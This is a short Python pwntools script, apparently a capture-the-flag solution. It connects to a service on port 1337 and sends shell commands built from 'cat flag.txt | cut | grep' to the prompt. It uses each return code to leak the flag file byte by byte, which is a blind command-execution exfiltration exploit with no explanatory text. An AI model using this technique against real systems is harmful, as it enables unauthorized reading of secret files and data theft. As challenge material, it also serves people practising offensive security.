from pwn import *
from string import printable
s = remote("127.0.0.1", 1337)

flag = ""
alphabet=a=",:!abcdefghijklmnopqrstuvwxyz_1234567890{}ABCDEFGHIJKLMNOPQRSTUVWXYZ "
pos=1
while 1:
    for c in alphabet:
        s.recvuntil("> ")
        _flag = c
        s.send(f'cat flag.txt| cut -b {pos} | grep -E "{c}"\n')
        rc = int(s.recvline().strip())
        if rc == 0:
            flag += c
            pos+=1
            print(flag)
            break